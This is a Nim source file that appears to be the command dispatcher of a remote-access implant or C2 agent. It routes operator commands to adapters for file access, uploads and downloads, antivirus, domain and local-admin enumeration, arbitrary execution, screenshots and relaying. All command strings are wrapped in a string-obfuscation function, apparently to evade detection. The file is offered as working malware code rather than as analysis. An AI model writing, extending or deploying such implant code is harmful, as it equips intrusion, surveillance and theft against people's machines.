#[
    Registry: CommandModuleRegistry
    Maps commands to their appropriate adapters
    Uses Strategy Pattern to route commands to correct modules
    Applies Dependency Inversion Principle
]#

import tables, options
import ../../domain/models/network_command_context
import ./command_modules/filesystem_command_adapter
import ./command_modules/network_command_adapter
import ./command_modules/system_command_adapter
import ./command_modules/execution_command_adapter
import ./command_modules/screenshot_command_adapter
import ./command_modules/relay_command_adapter
from ./string_obfuscation_adapter import obf

type
    CommandModuleRegistry* = object
        ## Registry that maps commands to their adapters
        filesystemAdapter*: FilesystemCommandAdapter
        networkAdapter*: NetworkCommandAdapter
        systemAdapter*: SystemCommandAdapter
        executionAdapter*: ExecutionCommandAdapter
        screenshotAdapter*: ScreenshotCommandAdapter
        relayAdapter*: RelayCommandAdapter
        # Map of command names to their adapter categories
        commandMap*: Table[string, string]

proc newCommandModuleRegistry*(): CommandModuleRegistry =
    ## Create a new CommandModuleRegistry instance
    ## Initializes all adapters and builds command mapping
    var registry = CommandModuleRegistry(
        filesystemAdapter: newFilesystemCommandAdapter(),
        networkAdapter: newNetworkCommandAdapter(),
        systemAdapter: newSystemCommandAdapter(),
        executionAdapter: newExecutionCommandAdapter(),
        screenshotAdapter: newScreenshotCommandAdapter(),
        relayAdapter: newRelayCommandAdapter(),
        commandMap: initTable[string, string]()
    )
    
    # Build command mapping
    # Filesystem commands
    registry.commandMap[obf("cat")] = "filesystem"
    registry.commandMap[obf("cd")] = "filesystem"
    registry.commandMap[obf("cp")] = "filesystem"
    registry.commandMap[obf("ls")] = "filesystem"
    registry.commandMap[obf("mkdir")] = "filesystem"
    registry.commandMap[obf("mv")] = "filesystem"
    registry.commandMap[obf("pwd")] = "filesystem"
    registry.commandMap[obf("rm")] = "filesystem"
    
    # Network commands
    registry.commandMap[obf("curl")] = "network"
    registry.commandMap[obf("download")] = "network"
    registry.commandMap[obf("upload")] = "network"
    registry.commandMap[obf("wget")] = "network"
    
    # System commands
    registry.commandMap[obf("env")] = "system"
    registry.commandMap[obf("getav")] = "system"
    registry.commandMap[obf("getdom")] = "system"
    registry.commandMap[obf("getlocaladm")] = "system"
    registry.commandMap[obf("ps")] = "system"
    registry.commandMap[obf("whoami")] = "system"
    
    # Execution commands
    registry.commandMap[obf("run")] = "execution"
    
    # Screenshot commands
    registry.commandMap[obf("screenshot")] = "screenshot"
    
    # Relay commands
    registry.commandMap[obf("relay")] = "relay"
    
    result = registry

proc getCommandModule*(registry: CommandModuleRegistry, cmd: string): tuple[requiresNetworkContext: bool] =
    ## Get information about a command
    ## Returns whether it requires NetworkCommandContext
    if not registry.commandMap.hasKey(cmd):
        return (requiresNetworkContext: false)  # Default fallback
    
    let category = registry.commandMap[cmd]
    
    case category:
    of "network":
        return (requiresNetworkContext: true)
    else:
        return (requiresNetworkContext: false)

proc executeCommand*(registry: CommandModuleRegistry, cmd: string, args: seq[string], cmdGuid: string, ctx: Option[NetworkCommandContext]): string =
    ## Execute a command using the appropriate adapter
    if not registry.commandMap.hasKey(cmd):
        return obf("ERROR: Unknown command: ") & cmd
    
    let category = registry.commandMap[cmd]
    
    case category:
    of "filesystem":
        return registry.filesystemAdapter.executeCommand(cmd, args, cmdGuid, ctx)
    of "network":
        if ctx.isNone:
            return obf("ERROR: Command requires network context but none provided")
        return registry.networkAdapter.executeCommand(cmd, args, cmdGuid, ctx)
    of "system":
        return registry.systemAdapter.executeCommand(cmd, args, cmdGuid, ctx)
    of "execution":
        return registry.executionAdapter.executeCommand(cmd, args, cmdGuid, ctx)
    of "screenshot":
        return registry.screenshotAdapter.executeCommand(cmd, args, cmdGuid, ctx)
    of "relay":
        return registry.relayAdapter.executeCommand(cmd, args, cmdGuid, ctx)
    else:
        return obf("ERROR: Unknown command category: ") & category

